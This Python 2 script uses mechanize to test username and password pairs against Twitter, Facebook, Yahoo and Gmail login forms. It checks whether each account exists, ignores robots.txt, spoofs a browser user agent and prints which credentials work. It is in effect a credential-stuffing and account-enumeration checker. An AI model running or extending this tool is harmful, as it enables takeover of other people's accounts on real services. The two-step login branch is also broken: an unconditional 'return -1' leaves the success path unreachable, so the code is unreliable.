import mechanize
import cookielib
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

SITES= {
	"twitter":("http://twitter.com/login", 0,1,"session[username_or_email]","session[password]","https://twitter.com/search-home",1,"q","No results"),
	"facebook":("http://www.facebook.com/login",0,0,"email","pass","https://m.facebook.com/login/identify",0,"email","try again"),
	"yahoo":("http://login.yahoo.com",1,0,"username", "password"),
	"gmail":("http://accounts.google.com/Login",1,0,"Email","Passwd")
	}

"""
VERIFY = {
	"check":("http://www.verifyemailaddress.org/",0,0,"email","not valid")
	}
"""
class Login:
	def __init__(self,username="", password=""):
		self.br = mechanize.Browser()
		
		# set cookies
		self.cookies = cookielib.LWPCookieJar()
		self.br.set_cookiejar(self.cookies)

		# self.browser settings (used to emulate a self.browser)
		self.br.set_handle_equiv(True)
		self.br.set_handle_gzip(True)
		self.br.set_handle_redirect(True)
		self.br.set_handle_referer(True)
		self.br.set_handle_robots(False)
		self.br.set_debug_http(False)
		self.br.set_debug_responses(False)
		self.br.set_debug_redirects(False)
		self.br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
		self.br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
		self.username = username
		self.password = password

	def check_user(self,site,username):
		urllogin = SITES[site][5]
		numform = SITES[site][6]
		userfield = SITES[site][7]
		error_str = SITES[site][8]

		self.br.open(urllogin) 
		self.br.select_form(nr=numform) # select the form
		self.br[userfield] = self.username
		
		self.br.submit() 
		resp = self.br.response().read()
                
		if error_str in resp:
			return -1
		else:
			return 1	
		
	def login(self, site, user="", passw=""):
		urllogin = SITES[site][0]
		submits = SITES[site][1]
		numform = SITES[site][2]
		userfield = SITES[site][3]
		pwfield = SITES[site][4]
		success = -1
		
		if(user != "" and passw != ""):
			self.username = user
			self.password = passw

		if(submits == 0):
			if self.check_user(site,self.username) == -1:
				print "\033[91m[-?]\033[0m","\033[94m %s\033[0m, Username: \033[91m%s\033[0m Password: \033[91m%s\033[0m" % (site.title(),self.username, self.password)
				return -1
		
			self.cookies.clear()
			self.br.open(urllogin) # open a site
			self.br.select_form(nr = numform) # select the form

			self.br[userfield] = self.username
			self.br[pwfield]= self.password
			self.br.submit() # submit the login data
			page2 = [control.name for form in self.br.forms() for control in form.controls]
		
			if userfield in page2 and pwfield in page2:
				success = -1
				print "\033[91m[+-]\033[0m","\033[94m %s\033[0m, Username: \033[92m%s\033[0m Password: \033[91m%s\033[0m" % (site.title(),self.username, self.password)
			else:
				success = 1
				print "\033[92m[++]\033[0m","\033[94m %s\033[0m, Username: \033[92m%s\033[0m Password: \033[92m%s\033[0m" % (site.title(),self.username, self.password)
		
			return success
		else:
			self.br.open(urllogin) # open a site
			self.br.select_form(nr = numform) # select the form
			self.br[userfield] = self.username
			self.br.submit() # Submit goto p2
			page2 = [control.name for form in self.br.forms() for control in form.controls]

			if pwfield not in page2:
				print "\033[91m[-?]\033[0m","\033[94m %s\033[0m, Username: \033[91m%s\033[0m Password: \033[91m%s\033[0m" % (site.title(),self.username, self.password)
				return -1
			
			self.br.select_form(nr = numform) # select the form
			self.br[pwfield]= self.password
			self.br.submit() # Submit, go to p3
			
			page3 = [control.name for form in self.br.forms() for control in form.controls]

			if pwfield in page3:
				print "\033[91m[+-]\033[0m","\033[94m %s\033[0m, Username: \033[92m%s\033[0m Password: \033[91m%s\033[0m" % (site.title(),self.username, self.password)
			return -1
			
			print "\033[92m[++]\033[0m","\033[94m %s\033[0m, Username: \033[92m%s\033[0m Password: \033[92m%s\033[0m " % (site.title(),self.username, self.password)
			return 1	
